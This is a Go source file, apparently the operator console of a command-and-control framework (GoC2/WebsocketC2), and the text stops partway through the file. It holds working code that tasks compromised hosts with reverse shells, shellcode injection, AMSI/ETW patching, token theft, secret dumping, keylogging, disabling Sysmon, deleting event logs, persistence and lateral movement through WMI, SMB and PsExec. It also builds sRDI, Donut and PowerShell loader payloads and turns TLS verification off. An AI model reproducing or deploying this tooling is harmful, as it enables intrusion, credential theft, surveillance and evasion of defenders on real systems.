package operator

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"time"

	"github.com/abiosoft/ishell/v2"
	"github.com/gorilla/websocket"
	"github.com/latortuga71/GoC2/internal/data"
	"github.com/latortuga71/GoC2/internal/db"
	"github.com/latortuga71/GoC2/internal/modules"
	"github.com/latortuga71/GoC2/internal/utils"
)

var OperatorDone chan interface{}
var OperatorCheckedInChan chan interface{}
var OperatorCheckedIn bool
var OperatorInterrupt chan os.Signal
var Operator *data.Operator
var ServerSharedSecret string
var ServerHostName string
var ServerRestPort string
var ServerWSPort string
var InChatRoom bool

func init() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	OperatorDone = make(chan interface{})          // Channel to indicate that the receiverHandler is done
	OperatorInterrupt = make(chan os.Signal)       // Channel to listen for interrupt signal to terminate gracefully
	signal.Notify(OperatorInterrupt, os.Interrupt) // Notify the interrupt channel for SIGINT
	OperatorCheckedInChan = make(chan interface{})
}

func OperatorAcquireCertificate() error {
	client := http.Client{
		Timeout: time.Minute * 3,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
	certRequest := &data.CertRequest{
		SharedSecret: ServerSharedSecret,
	}
	certBytes, err := json.Marshal(certRequest)
	if err != nil {
		log.Fatal(err)
	}
	r, err := client.Post(fmt.Sprintf("https://%s:%s/about/contact", ServerHostName, ServerRestPort), "application/json", bytes.NewBuffer(certBytes))
	if err != nil {
		return err
	}
	certDataReturned := &data.CertRequest{}
	err = json.NewDecoder(r.Body).Decode(&certDataReturned)
	if err != nil {
		return err
	}
	decodedCert, err := base64.StdEncoding.DecodeString(certDataReturned.B64ClientCertificate)
	decodedKey, err := base64.StdEncoding.DecodeString(certDataReturned.B64ClientPrivateKey)
	decodedCa, err := base64.StdEncoding.DecodeString(certDataReturned.B64RootCaCertificate)
	if err != nil {
		return err
	}
	Operator.OperatorCertPem = string(decodedCert)
	Operator.OperatorRootCa = string(decodedCa)
	Operator.OperatorKeyPem = string(decodedKey)
	return nil
}

func InitializeOperator(nick string) error {
	Operator = data.NewOperator(nick)
	Operator.OperatorCaCertPool = x509.NewCertPool()
	Operator.Conn = nil
	err := OperatorAcquireCertificate()
	if err != nil {
		return err
	}
	clientCertificate, err := tls.X509KeyPair([]byte(Operator.OperatorCertPem), []byte(Operator.OperatorKeyPem))
	if err != nil {
		return err
	}
	ok := Operator.OperatorCaCertPool.AppendCertsFromPEM([]byte(Operator.OperatorRootCa))
	if !ok {
		return errors.New("could not load ca certificate.")
	}
	Operator.OperatorTLSCertificate = clientCertificate
	return nil
}

func OperatorDoCheckIn(operator *data.Operator) error {
	checkInMessage := &data.Message{
		MessageType: "OperatorCheckIn",
		MessageData: Operator.ToBytes(),
	}
	err := operator.Conn.WriteMessage(checkInMessage.ToBytes())
	if err != nil {
		log.Fatal("Failed to check in: ", err)
	}
	go func() {
		time.Sleep(time.Second * 5)
		if !OperatorCheckedIn {
			operator.Conn.WriteMessage(websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			log.Fatal(errors.New("Failed to check in. Check your shared secret. Change your nick. Check Your Server."))
		}
	}()
	<-OperatorCheckedInChan
	OperatorCheckedIn = true
	return nil
}

func OperatorReceiveHandler(operator *data.Operator) {
	connection := operator.Conn
	for {
		msg, err := connection.ReadMessage()
		if err != nil {
			log.Println("Error in receive:", err)
			OperatorInterrupt <- os.Interrupt
			log.Println("Closing Connection.")
			break
		}
		err, messageType := utils.CheckMessage(msg)
		switch messageType {
		case "Exit":
			OperatorInterrupt <- os.Interrupt
			log.Println("Closing Connection.")
			break
		case "OperatorCheckIn":
			err := OperatorHandleCheckInResp(msg)
			if err != nil {
				log.Fatal(err)
			}
			OperatorCheckedInChan <- true
		case "TaskResult":
			err, result := OperatorHandleTaskResult(msg)
			if err != nil {
				log.Printf("Failed to read result %v\n", err)
			}
			fmt.Printf("%s", result)
		default:
		}
	}
}

func OperatorHandleTaskResult(message []byte) (error, string) {
	m := &data.Message{}
	err := json.Unmarshal(message, m)
	if err != nil {
		log.Printf("Error reading task result into json %+v\n", err)
		return err, ""
	}
	r := &data.TaskResult{}
	err = json.Unmarshal(m.MessageData, r)
	if err != nil {
		log.Printf("Error reading task result into json %+v\n", err)
		return err, ""
	}
	if r.TaskId == "ScreenshotTask" {
		file, err := ioutil.TempFile(".", "*.zip.base64")
		if err != nil {
			return err, ""
		}
		wrote, err := file.Write([]byte(r.Result))
		if err != nil {
			return err, ""
		}
		name := file.Name()
		file.Close()
		return nil, fmt.Sprintf("Downloaded %d Bytes to %s\n", wrote, name)
	}
	if r.TaskId == "DownloadTask" {
		file, err := ioutil.TempFile(".", "*.gz.base64")
		if err != nil {
			return err, ""
		}
		wrote, err := file.Write([]byte(r.Result))
		if err != nil {
			return err, ""
		}
		name := file.Name()
		file.Close()
		return nil, fmt.Sprintf("Downloaded %d Bytes to %s\n", wrote, name)
	}
	return nil, r.Result
}

func OperatorKeepAlive() {
	for {
		select {
		case <-OperatorInterrupt:
			log.Println("Received SIGINT interrupt signal. Closing all pending connections")
			err := Operator.Conn.WriteMessage(websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Println("Error during closing websocket:", err)
				return
			}
			close(OperatorDone)
			select {
			case <-OperatorDone:
				log.Println("Receiver Channel Closed! Exiting....")
				os.Exit(0)
			case <-time.After(time.Duration(1) * time.Second):
				log.Println("Timeout in closing receiving channel. Exiting....")
			}
			return
		}
	}
}
func OperatorHandleCheckInResp(message []byte) error {
	m := &data.Message{}
	o := &data.Operator{}
	err := json.Unmarshal(message, m)
	if err != nil {
		log.Printf("Error Handling Operator CheckIn Response\n")
		return err
	}
	err = json.Unmarshal(m.MessageData, o)
	if err != nil {
		log.Printf("Error Handling Operator CheckIn Response\n")
		return err
	}
	return nil
}

func ShellTask(c *ishell.Context, clientId string) bool {
	prompt := fmt.Sprintf("%s >>> ", clientId)
	for {
		c.SetPrompt(prompt)
		c.Printf(prompt)
		c.ShowPrompt(true)
		args := c.ReadLine()
		if strings.TrimSpace(args) == "exit" {
			break
		}
		if strings.TrimSpace(args) == "back" {
			break
		}
		if strings.TrimSpace(args) == "\n" {
			continue
		}
		if strings.TrimSpace(args) == "" {
			continue
		}
		//argsArray := strings.Split(args, " ")
		argsArray := ParseRawTextCmd(args)
		task := &data.Task{
			ClientId:   clientId,
			OperatorId: Operator.OperatorNick,
			Command:    "shell", // made need to change this
			Args:       argsArray,
		}
		message := &data.Message{
			MessageType: "Task",
			MessageData: task.ToBytes(),
		}
		err := Operator.Conn.WriteMessage(message.ToBytes())
		if err != nil {
			return false
		}
	}
	return true
}

func PrepareShellcodeTask(c *ishell.Context, clientId string, command string, prompt string) bool {
	c.Printf(prompt)
	args := c.ReadLine()
	argsArray := strings.Split(args, " ")
	if len(argsArray) < 1 {
		c.Println("Didnt provide args.")
		return false
	}
	localFilePath := argsArray[0]
	//argsArray[0] = argsArray[1]
	argsArray = argsArray[1:]
	dataBytes, err := os.ReadFile(localFilePath)
	if err != nil {
		c.Println(err.Error())
		return false
	}
	task := &data.Task{
		ClientId:   clientId,
		OperatorId: Operator.OperatorNick,
		Command:    command, // upload
		Args:       argsArray,
		File:       dataBytes,
	}
	message := &data.Message{
		MessageType: "Task",
		MessageData: task.ToBytes(),
	}
	err = Operator.Conn.WriteMessage(message.ToBytes())
	if err != nil {
		return false
	}
	return true
}

func PrepareUploadTask(c *ishell.Context, clientId string, command string, prompt string) bool {
	c.Printf(prompt)
	args := c.ReadLine()
	argsArray := strings.Split(args, " ")
	localFilePath := argsArray[0]
	remoteDir := argsArray[1]
	if remoteDir == "" {
		c.Println("Remote dir not provided")
		return false
	}
	dataBytes, err := os.ReadFile(localFilePath)
	if err != nil {
		c.Println(err.Error())
		return false
	}
	task := &data.Task{
		ClientId:   clientId,
		OperatorId: Operator.OperatorNick,
		Command:    command,             // upload
		Args:       []string{remoteDir}, // remote dir
		File:       dataBytes,
	}
	message := &data.Message{
		MessageType: "Task",
		MessageData: task.ToBytes(),
	}
	err = Operator.Conn.WriteMessage(message.ToBytes())
	if err != nil {
		return false
	}
	return true
}

func PrepareTaskWithOneArg(c *ishell.Context, clientId string, command string, prompt string) bool {
	c.Printf(prompt)
	args := c.ReadLine()
	var argsArray []string
	argsArray = append(argsArray, args)
	task := &data.Task{
		ClientId:   clientId,
		OperatorId: Operator.OperatorNick,
		Command:    command,
		Args:       argsArray,
	}
	message := &data.Message{
		MessageType: "Task",
		MessageData: task.ToBytes(),
	}
	err := Operator.Conn.WriteMessage(message.ToBytes())
	if err != nil {
		return false
	}
	return true
}

func PrepareTaskWithArgs(c *ishell.Context, clientId string, command string, prompt string) bool {
	c.Printf(prompt)
	argsArray := ParseRawTextCmd(c.ReadLine())
	//args := c.ReadLine()
	//argsArray := strings.Split(args, " ")
	task := &data.Task{
		ClientId:   clientId,
		OperatorId: Operator.OperatorNick,
		Command:    command,
		Args:       argsArray,
	}
	message := &data.Message{
		MessageType: "Task",
		MessageData: task.ToBytes(),
	}
	err := Operator.Conn.WriteMessage(message.ToBytes())
	if err != nil {
		return false
	}
	return true
}

func PrepareTaskSimple(c *ishell.Context, clientId string, command string) bool {
	task := &data.Task{
		ClientId:   clientId,
		OperatorId: Operator.OperatorNick,
		Command:    command,
	}
	message := &data.Message{
		MessageType: "Task",
		MessageData: task.ToBytes(),
	}
	err := Operator.Conn.WriteMessage(message.ToBytes())
	if err != nil {
		return false
	}
	return true
}

func ParseRawTextCmdDoubleQuote(rawString string) []string {
	inQuote := false
	args := make([]string, 0)
	tmpStr := ""
	for c := range rawString {
		if rawString[c] == ' ' {
			if inQuote {
				tmpStr += string(rawString[c])
				continue
			}
			args = append(args, tmpStr)
			tmpStr = ""
			continue
		}
		if rawString[c] == '"' {
			if inQuote {
				inQuote = false
				continue
			}
			inQuote = true
			continue
		}
		tmpStr += string(rawString[c])
	}
	args = append(args, tmpStr)
	return args
}

func ParseRawTextCmd(rawString string) []string {
	inQuote := false
	args := make([]string, 0)
	tmpStr := ""
	for c := range rawString {
		if rawString[c] == ' ' {
			if inQuote {
				tmpStr += string(rawString[c])
				continue
			}
			args = append(args, tmpStr)
			tmpStr = ""
			continue
		}
		if rawString[c] == '\'' {
			if inQuote {
				inQuote = false
				continue
			}
			inQuote = true
			continue
		}
		tmpStr += string(rawString[c])
	}
	args = append(args, tmpStr)
	return args
}

func PrepareLoader(c *ishell.Context) bool {
	c.Printf("<shellcodePath>: ")
	args := c.ReadLine()
	argz := ParseRawTextCmd(args)
	if len(args) < 1 {
		return false
	}
	path := argz[0]
	raw, err := ioutil.ReadFile(path)
	if err != nil {
		c.Printf(err.Error())
		return false
	}
	// POST BYTES
	payload := data.LoaderPayload{
		RawShellcodeBytes: raw,
		LoaderType:        "powershell",
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	endpoint := fmt.Sprintf("https://%s:%s/v1/loaders", ServerHostName, ServerRestPort)
	body, err := DoPostRequest(endpoint, jsonData)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	convertedPayload := data.LoaderPayload{}
	err = json.Unmarshal(body, &convertedPayload)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}

	//c.Printf("%+v\n", convertedPayload)
	file, err := ioutil.TempFile(".", "*.loader.ps1")
	defer file.Close()
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	wrote, err := file.Write([]byte(convertedPayload.LoaderString))
	if err != nil {
		c.Printf("%s%s", err.Error())
		return false
	}
	file2, err := ioutil.TempFile(".", "*.loaderb64.ps1")
	defer file2.Close()
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	wrote2, err := file2.Write([]byte(convertedPayload.LoaderStringB64))
	if err != nil {
		c.Printf("%s%s", err.Error())
		return false
	}
	c.Printf("Wrote payload to disk %s %d bytes\nWrote payload to disk %s %d bytes\n", file.Name(), wrote, file2.Name(), wrote2)
	return true
}

func PrepareSRDI(c *ishell.Context) bool {
	c.Printf("<dllPath> <functionToCall>: ")
	args := c.ReadLine()
	argz := ParseRawTextCmd(args)
	if len(args) < 2 {
		return false
	}
	path := argz[0]
	function := argz[1]
	raw, err := ioutil.ReadFile(path)
	if err != nil {
		c.Printf(err.Error())
		return false
	}
	// POST BYTES
	payload := data.SRDIPayload{
		RawDllBytes:     raw,
		DllFunctionName: function,
		ConvertedDll:    nil,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	endpoint := fmt.Sprintf("https://%s:%s/v1/srdi", ServerHostName, ServerRestPort)
	body, err := DoPostRequest(endpoint, jsonData)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	convertedPayload := data.SRDIPayload{
		ConvertedDll: nil,
	}
	err = json.Unmarshal(body, &convertedPayload)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	file, err := ioutil.TempFile(".", "*.srdiPayload.bin")
	defer file.Close()
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	wrote, err := file.Write(convertedPayload.ConvertedDll)
	if err != nil {
		c.Printf("%s%s", err.Error())
		return false
	}
	c.Printf("Wrote payload to disk %s %d bytes", file.Name(), wrote)
	return true
}

func PrepareDonut2(c *ishell.Context) bool {
	c.Printf("<pePath> <\"donut args string\">: ")
	args := c.ReadLine()
	argz := ParseRawTextCmdDoubleQuote(args)
	if len(args) < 2 {
		return false
	}
	path := argz[0]
	donutString := argz[1]
	raw, err := ioutil.ReadFile(path)
	if err != nil {
		c.Printf(err.Error())
		return false
	}
	fileType := filepath.Ext(path)
	// POST BYTES
	payload := data.DonutPayload{
		RawPEBytes:  raw,
		DonutString: donutString,
		ConvertedPE: nil,
		FileType:    fileType,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	endpoint := fmt.Sprintf("https://%s:%s/v1/donut", ServerHostName, ServerRestPort)
	body, err := DoPostRequest(endpoint, jsonData)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	convertedPayload := data.DonutPayload{
		ConvertedPE: nil,
	}
	err = json.Unmarshal(body, &convertedPayload)
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	file, err := ioutil.TempFile(".", "*.donut.bin")
	defer file.Close()
	if err != nil {
		c.Printf("%s", err.Error())
		return false
	}
	wrote, err := file.Write(convertedPayload.ConvertedPE)
	if err != nil {
		c.Printf("%s%s", err.Error())
		return false
	}
	fmt.Printf("Wrote payload to disk %s %d bytes", file.Name(), wrote)
	return true
}

func PrepareDonut(c *ishell.Context) bool {
	c.Printf("DonutCmdLine: ")
	c.Printf("[+] Donut Ready")
	return true
}

func PrepareExitTask(clientId string, command string) bool {
	task := &data.Task{
		ClientId:   clientId,
		OperatorId: Operator.OperatorNick,
		Command:    command,
	}
	message := &data.Message{
		MessageType: "Task",
		MessageData: task.ToBytes(),
	}
	err := Operator.Conn.WriteMessage(message.ToBytes())
	if err != nil {
		return false
	}
	return true
}
func SendChatMessage(msg string) {
	//message := fmt.Sprintf("[ %s ] <_%s_>: %s", time.Now().Format(time.RFC1123), Operator.OperatorNick, msg)
	err := Operator.ChatConn.WriteMessage([]byte(msg))
	if err != nil {
		log.Println(err)
	}
}

func SendTask(clientId string, command string, c *ishell.Context) {
	switch command {
	case "info":
		PrepareTaskSimple(c, clientId, command)
	case "sleep":
		PrepareTaskWithOneArg(c, clientId, command, "<Sleep>: ")
	case "jitter":
		PrepareTaskWithOneArg(c, clientId, command, "<Jitter>: ")
	case "exit":
		break
	case "exit-process":
		PrepareExitTask(clientId, command)
	case "ifconfig":
		PrepareTaskSimple(c, clientId, command)
	case "pwd":
		PrepareTaskSimple(c, clientId, command)
	case "touch":
		PrepareTaskWithArgs(c, clientId, command, "<filePath> <fileContents>: ")
	case "cp":
		PrepareTaskWithArgs(c, clientId, command, "<sourcePath> <destinationPath>: ")
	case "mv":
		PrepareTaskWithArgs(c, clientId, command, "<sourcePath> <destinationPath>: ")
	case "ls":
		PrepareTaskWithArgs(c, clientId, command, "<Directory> ")
	case "cd":
		PrepareTaskWithArgs(c, clientId, command, "<Directory> ")
	case "reverse-shell":
		PrepareTaskWithArgs(c, clientId, command, "<Ip> <Port>:")
	case "shell":
		ShellTask(c, clientId)
	case "download":
		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
	case "upload":
		PrepareUploadTask(c, clientId, command, "<LocalFile> <RemoteDirectory>: ")
	case "mkdir":
		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
	case "rmdir":
		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
	case "rm":
		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
	case "killproc":
		PrepareTaskWithArgs(c, clientId, command, "<Pid>: ")
	case "env":
		PrepareTaskSimple(c, clientId, command)
	case "ps":
		PrepareTaskSimple(c, clientId, command)
	case "list-services":
		PrepareTaskSimple(c, clientId, command)
	case "self-inject":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile>: ")
	case "raw-self-inject":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile>: ")
	case "remote-inject":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <Pid>: ")
	case "spawn-inject":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn>: ")
	case "spawn-inject-pipe":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn> <TimeoutMins>: ")
	case "spawn-inject-token":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn> <PidToSteal>: ")
	case "screenshot":
		PrepareTaskSimple(c, clientId, command)
	case "run":
		PrepareTaskWithArgs(c, clientId, command, "<RemoteBinaryPath>: ")
	case "logon-user-netonly":
		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password>: ")
	case "logon-user":
		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password> <pathToBinary>: ")
	case "whoami":
		PrepareTaskSimple(c, clientId, command)
	case "rev2self":
		PrepareTaskSimple(c, clientId, command)
	case "patch-etw":
		PrepareTaskSimple(c, clientId, command)
	case "patch-amsi":
		PrepareTaskSimple(c, clientId, command)
	case "remote-download":
		PrepareTaskWithArgs(c, clientId, command, "<RemoteUrl> <RemoteFilePath>: ")
	case "steal-token":
		PrepareTaskWithArgs(c, clientId, command, "<pid>: ")
	case "cat":
		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
	case "create-process-token":
		PrepareTaskWithArgs(c, clientId, command, "<pid> <RemotePath> <binaryArgs>: ")
	case "create-process-creds":
		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password> <binaryPath> <binaryArgs>: ")
	case "spawn-inject-creds":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <domain> <userName> <password> <binaryPath> <binaryArgs>: ")
	case "run-key":
		PrepareTaskWithArgs(c, clientId, command, "<RunKeyName> <RunCommand>: ")
	case "logon-script":
		PrepareTaskWithArgs(c, clientId, command, "<PathToPersistScript>: ")
	case "unhook-ntdll":
		PrepareTaskSimple(c, clientId, command)
	case "chisel":
		PrepareTaskWithArgs(c, clientId, command, "<ChiselArgs>: ")
	case "get-system":
		PrepareTaskSimple(c, clientId, command)
	case "enable-priv":
		PrepareTaskWithArgs(c, clientId, command, "<PrivilegeName>: ")
	case "show-priv":
		PrepareTaskSimple(c, clientId, command)
	case "disable-priv":
		PrepareTaskWithArgs(c, clientId, command, "<PrivilegeName>: ")
	case "enum-tokens":
		PrepareTaskSimple(c, clientId, command)
	case "port-forward":
		PrepareTaskWithArgs(c, clientId, command, "<listenPort> <listenAddr> <connectPort> <connectAddr>: ")
	case "revert-port-forward":
		PrepareTaskSimple(c, clientId, command)
	case "dump-process":
		PrepareTaskWithArgs(c, clientId, command, "<pid> <dumpFilePath>")
	case "dump-secrets":
		PrepareTaskSimple(c, clientId, command)
	case "dump-secrets-remote":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain> <username> <password>")
	//case "enum-users": // moved to enum local
	//	PrepareTaskSimple(c, clientId, command)
	//case "enum-groups":
	//	PrepareTaskSimple(c, clientId, command)
	//case "enum-domain":
	//	PrepareTaskSimple(c, clientId, command)
	case "admin-check":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>: ")
	case "disable-sysmon":
		PrepareTaskSimple(c, clientId, command)
	case "create-service":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName> <serviceBinary>: ")
	case "delete-service":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName>: ")
	case "start-service":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName>: ")
	case "stop-service":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName>: ")
	case "list-ports":
		PrepareTaskSimple(c, clientId, command)
	case "delete-event-log":
		PrepareTaskWithArgs(c, clientId, command, "<eventLogName>: ")
	case "scheduled-task":
		PrepareTaskWithArgs(c, clientId, command, "<hostname> <taskName> <taskFrequency> <taskStartTime> <taskBinary> ")
	case "create-scheduled-task":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <taskName> <taskFrequency> <taskStartTime> <taskBinary> ")
	case "execute-scheduled-task":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <taskName>")
	case "delete-scheduled-task":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <taskName>")
	case "powershell-profile":
		PrepareTaskWithOneArg(c, clientId, command, "<powershellCommandToRun>: ")
	case "powershell-history":
		PrepareTaskSimple(c, clientId, command)
	case "wmi-exec":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <passwordOrNtHash> <command>: ")
	case "smb-exec":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <password><command>: ")
	case "list-shares":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <passwordOrNthash> <command>: ")
	case "ps-exec":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <password> <Url of binary> <command>: ")
	case "fileless-service":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName> <b64powershell>: ")
	case "subnet-scan":
		PrepareTaskWithOneArg(c, clientId, command, "<192.168.1.0>: ")
	case "port-scan":
		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <port>: ")
	case "shell-history":
		PrepareTaskSimple(c, clientId, command)
	case "go-up":
		PrepareTaskSimple(c, clientId, command)
	case "start-keylogger":
		PrepareTaskSimple(c, clientId, command)
	case "stop-keylogger":
		PrepareTaskSimple(c, clientId, command)
	case "start-clipboard-monitor":
		PrepareTaskSimple(c, clientId, command)
	case "stop-clipboard-monitor":
		PrepareTaskSimple(c, clientId, command)
	case "launch-items":
		PrepareTaskWithArgs(c, clientId, command, "<com.fake.plist> <binaryPath> <Args>: ")
	case "login-items":
		PrepareTaskWithOneArg(c, clientId, command, "<pathToBinary>: ")
	case "crontab":
		PrepareTaskWithOneArg(c, clientId, command, "<command>: ")
	case "memfd_create":
		PrepareShellcodeTask(c, clientId, command, "<localFile> <fakeProcessName>: ")
	case "dump-credential-mgr":
		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
	case "load-custom-coff":
		PrepareShellcodeTask(c, clientId, command, "<Local COFF to send>: ")
	case "load-custom-pe":
		PrepareShellcodeTask(c, clientId, command, "<Local PE to send> <exe,dll> <exportNameIfDLL>: ")
	case "enum-drivers":
		PrepareTaskSimple(c, clientId, command)
	case "list-library":
		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
	case "enum-rwx-memory":
		PrepareTaskSimple(c, clientId, command)
	case "remote-inject-stealth":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <Pid> <AddressToInject>: ")
	case "peruns-fart":
		PrepareTaskSimple(c, clientId, command)
	case "load-library":
		PrepareTaskWithOneArg(c, clientId, command, "<Dll to load>: ")
	case "free-library":
		PrepareTaskWithOneArg(c, clientId, command, "<dll to free>: ")
	case "module-stomp":
		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <ModuleAddress>: ")
	case "hook-check":
		PrepareTaskSimple(c, clientId, command)
	case "nslookup":
		PrepareTaskWithOneArg(c, clientId, command, "<Domain/HostName>: ")
	case "reverse-lookup":
		PrepareTaskWithOneArg(c, clientId, command, "<IP>: ")
	case "list-pipes":
		PrepareTaskSimple(c, clientId, command)
	case "winrm-exec":
		PrepareTaskWithArgs(c, clientId, command, "<Host> <Port> <Command> <SSL 1,0>: ")
	case "add-user":
		PrepareTaskWithArgs(c, clientId, command, "<user> <pass>: ")
	case "remove-user":
		PrepareTaskWithOneArg(c, clientId, command, "<user>: ")
	case "add-user-group":
		PrepareTaskWithArgs(c, clientId, command, "<user> <group>: ")
	case "remove-user-group":
		PrepareTaskWithArgs(c, clientId, command, "<user> <group>: ")
	//case "enum-logons": moved to enum-local
	//	PrepareTaskSimple(c, clientId, command)
	case "powershell":
		PrepareTaskWithArgs(c, clientId, command, "<Get-ChildItem -force -something -test>: ")
	case "enum-local":
		PrepareTaskSimple(c, clientId, command)
	//case "modify-service-binary":
	//	PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName> <serviceBinaryPath>: ")
	case "dotnet-check":
		PrepareTaskSimple(c, clientId, command)
	case "hostname":
		PrepareTaskSimple(c, clientId, command)
	case "list-remote-services":
		PrepareTaskWithOneArg(c, clientId, command, "<remoteMachine>: ")
	case "list-loggedon-users":
		PrepareTaskWithOneArg(c, clientId, command, "<remoteMachine>: ")
	case "enum-handles":
		PrepareTaskSimple(c, clientId, command)
	case "console-check":
		PrepareTaskSimple(c, clientId, command)
	case "start-ws-pivot":
		PrepareTaskWithArgs(c, clientId, command, "<listenAddr> <c2ListenAddr>: ")
	case "start-http-pivot":
		PrepareTaskWithArgs(c, clientId, command, "<listenAddr> <c2ListenAddr>: ")
	case "stop-ws-pivot":
		PrepareTaskSimple(c, clientId, command)
	case "stop-http-pivot":
		PrepareTaskSimple(c, clientId, command)
	default:
		c.Println("Task not found.")
	}
}

func GetOnlineClientIds() ([]string, error) {
	ids := make([]string, 0)
	endpoint := fmt.Sprintf("https://%s:%s/v1/clients", ServerHostName, ServerRestPort)
	body, err := DoGetRequest(endpoint)
	if err != nil {
		return nil, err
	}
	clients := make(map[string]data.Client)
	err = json.Unmarshal(body, &clients)
	if err != nil {
		return nil, err
	}
	for k := range clients {
		if clients[k].Online {
			ids = append(ids, k)
		}

	}
	return ids, nil
}

func GetClientIds() ([]string, error) {
	endpoint := fmt.Sprintf("https://%s:%s/v1/clients", ServerHostName, ServerRestPort)
	resp, err := http.Get(endpoint)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	clients := make(map[string]db.ClientDB)
	err = json.Unmarshal(body, &clients)
	if err != nil {
		return nil, err
	}
	var clientsArray []string
	for k := range clients {
		clientsArray = append(clientsArray, k)
	}
	if len(clientsArray) == 0 {
		return nil, errors.New("No Clients.")
	}
	return clientsArray, nil
}

func DoDeleteRequest(endpoint string) ([]byte, error) {
	c := http.Client{}
	del, err := http.NewRequest(http.MethodDelete, endpoint, nil)
	if err != nil {
		return nil, err
	}
	resp, err := c.Do(del)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return body, nil
}

func DoPostRequest(endpoint string, payload []byte) ([]byte, error) {
	resp, err := http.Post(endpoint, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if resp.StatusCode > 202 {
		return nil, fmt.Errorf("ERROR Status Code %d %s", resp.StatusCode, string(body))
	}
	if err != nil {
		return nil, err
	}
	return body, nil
}

func DoGetRequest(endpoint string) ([]byte, error) {
	resp, err := http.Get(endpoint)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return body, nil
}

func OperatorMainLoop() {
	shell := ishell.New()
	shell.Println("WebsocketC2")
	shell.AddCmd(&ishell.Cmd{
		Name: "results",
		Help: "show results",
		Func: func(c *ishell.Context) {
			defer c.ShowPrompt(true) // yes, revert after login.
			c.ShowPrompt(false)
			clientsArray, err := GetClientIds()
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			choice := c.MultiChoice(clientsArray, "Choose a client")
			endpoint := fmt.Sprintf("https://%s:%s/v1/client/%s/results", ServerHostName, ServerRestPort, clientsArray[choice])
			body, err := DoGetRequest(endpoint)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			tasks := []data.TaskResult{}
			err = json.Unmarshal(body, &tasks)
			if err != nil {
				log.Fatalf("Failed to unmarshal task json")
			}
			if len(tasks) == 0 {
				c.Printf("No Results.")
				return
			}
			clean, err := json.MarshalIndent(tasks, "", " ")
			if err != nil {
				log.Fatalf("Failed to unmarshal json")
			}
			c.Printf("%s", string(clean))
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "sRDI",
		Help: "generate sRDI payload",
		Func: func(c *ishell.Context) {
			c.Println("Example ->  /tmp/test.dll boom")
			c.Println("Example ->  C:\\Temp\\BadDLL.dll boom")
			PrepareSRDI(c)
		},
	})
